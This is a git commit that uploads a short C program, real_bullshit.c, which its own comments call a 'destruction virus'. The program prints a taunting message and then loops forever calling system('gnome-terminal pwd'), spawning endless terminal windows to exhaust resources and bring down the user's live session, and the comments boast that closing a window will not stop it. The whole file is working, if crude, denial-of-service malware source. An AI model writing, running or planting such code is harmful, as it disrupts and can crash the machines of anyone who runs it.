b584dded5cacc764e07588f9bc10f0b03476cca4
Gul'dan <92905002+K0K0SHA@users.noreply.github.com>
2022-08-24 04:03:45 -0400

    Add files via upload

---
+++ real_bullshit.c
@@ -0,0 +1,17 @@
+#include <stdio.h>
+#include <stdlib.h>
+// filename: real_bullshit.c
+// file description: (less) basic destruction virus based on BULLSHIT
+// destroys a live session by spam-spawning terminal windows
+// disarm instructions: simply close terminal window
+// actually, you can't disarm this real bullshit like that. It don't work!
+
+int main(){
+
+	printf("welcome to the infinite loop, SUCKER!");
+
+	while(420>69){
+		system("gnome-terminal pwd");
+		// spawns infinite terminal windows
+	}
+}
